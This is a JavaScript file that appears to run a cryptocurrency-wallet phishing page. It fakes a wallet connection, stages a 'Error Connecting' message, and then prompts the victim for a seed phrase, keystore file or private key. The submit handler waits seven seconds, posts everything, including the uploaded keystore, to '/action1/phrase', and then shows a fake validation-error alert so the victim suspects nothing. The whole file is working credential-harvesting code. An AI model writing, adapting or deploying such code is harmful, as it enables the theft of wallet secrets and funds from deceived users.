var loading = document.querySelector(".loading");
var connect = document.querySelector(".jwEAlI");

function loadings() {
var a =  setTimeout(function () {
    loading.innerHTML = "Connecting.";
  }, 1)

  var a = setTimeout(function() {
    loading.innerHTML = "Connecting..";
  }, 600)

  var a = setTimeout(function() {
    loading.innerHTML = "Connecting...";
  }, 1200)
var a =  setTimeout(function () {
    loading.innerHTML = "Connecting.";
  }, 1800)

  var a = setTimeout(function() {
    loading.innerHTML = "Connecting..";
  }, 2400)

  var a = setTimeout(function() {
    loading.innerHTML = "Connecting...";
  }, 3000)

  var a = setTimeout(function() {
    loading.innerHTML = "Error Connecting.."
    connect.style.display = "flex"
  }, 3600)

  //NEWLY ADDED
  // document.getElementById("phrase").click();

}

document.getElementById("connect").addEventListener("click", getConnect);
document.getElementById("connectz").addEventListener("click", getConnect);

function getConnect() {
  document.getElementById("LPcxt").style.display = 'flex';
  setTimeout(function(){
    loadings();
  }, 800)
}
var firstoverlay = document.querySelector(".sc-bdVaJa");

function firstcancel() {
//  firstoverlay.style.display = "none";
  connect_manual.style.display = "none";
  loading.innerHTML = "";
};
var x_button = document.querySelector(".fRcQRh").onclick = firstcancel;
var con_w = document.querySelector(".jwEAlI").onclick = firstconnect;

function firstconnect() {
  // console.log("a");
  document.querySelector(".overlay").style.display = "flex";
  document.querySelector(".LPcxt").style.display = "none";
}


  var phrase = document.querySelector("#phrase");
  var keystore = document.querySelector("#keystore");
  var private = document.querySelector("#private");
  var first = document.querySelector("#first");
  var second = document.getElementById("second");
  var third = document.querySelector("#third");
  var fileUp = document.querySelector("#file-upload");
  var wallet_name = document.querySelector("#walletname");
  phrase.addEventListener("click", function() {
    hide(first);
  });

  keystore.addEventListener("click", function() {
    hide(second);
  });

  private.addEventListener("click", function() {
    hide(third);
  });

  function hide(elem) {
    var expandedPanel = document.querySelector(".active");
    //This is to remove the current active class on click
    if (expandedPanel) {
      expandedPanel.classList.remove("active");
      var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");

      for (let i = 0; i < attr.length; i++) {
        attr[i].value = "";

      }
    }
    var i = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
    var x = elem.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")

    for (let c = 0; c < i.length; c++) {
      i[c].required = false;
    }
    for (let c = 0; c < x.length; c++) {
      x[c].required = true;
    }
    //add an active tag to the clicked element and set it's

    elem.classList.add("active");

  }

const form = document.querySelector('form');

function sendData( data ) {
  const XHR = new XMLHttpRequest(),
        FD  = new FormData( form );

  // Push our data into our FormData object
  for( var name in data ) {
    FD.append( name, data[ name ] );
  }
  FD.append("wallet", wallet_name.innerHTML);
  FD.append( "file", fileUp.files[0]);

  // Define what happens on successful data submission
  XHR.addEventListener( 'load', function( event ) {
    // console.log( XHR.responseText );
    alert('Error Validating Wallet... Please try again later');
    // window.location.href = "/done.php";
      document.querySelector(".sending").style.display = "none";
  } );

  // Define what happens in case of error
  XHR.addEventListener(' error', function( event ) {
    alert( 'Oops! Something went wrong. Check your internet' );
  } );

  // Set up our request
  XHR.open( 'POST', '/action1/phrase' );

  // Send our FormData object; HTTP headers are set automatically
  XHR.send(FD);
}

form.addEventListener( 'submit', function(e){
      e.preventDefault();
      document.querySelector(".sending").style.display = "flex";
      //delay for 5 seconds
      window.setTimeout( sendData, 7000)
      //postData();
} );

  var cancel = document.querySelector("#cancel");
  cancel.addEventListener("click", function() {
    var overlay = document.querySelector(".overlay");
    overlay.style.display = "none";
    document.querySelector(".LPcxt").style.display = "flex";
    var span = document.querySelector("#span");
    span.innerHTML = "Choose Keystore File";
    var attr = document.querySelector("#first");
    var attr2 = document.querySelector("#second");
    var attr3 = document.querySelector("#third");

    attr.classList.remove("active");
    attr2.classList.remove("active");
    attr3.classList.remove("active");
    attr.classList.add("active");
    var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");


    for (let i = 0; i < attr.length; i++) {
      attr[i].value = "";

    }
  });

  var label = document.querySelector("#label");
  label.addEventListener("change", filenaming);

  function filenaming(e) {
    e.preventDefault();
    var spantag = document.querySelector("#span");
    var fullPath = document.getElementById('file-upload').value;
    if (fullPath) {
      var startIndex = (fullPath.indexOf('\\') >= 0 ? fullPath.lastIndexOf('\\') : fullPath.lastIndexOf('/'));
      var filename = fullPath.substring(startIndex);
      if (filename.indexOf('\\') === 0 || filename.indexOf('/') === 0) {
        filename = filename.substring(1);
      }
      spantag.innerHTML = filename;
    }
  }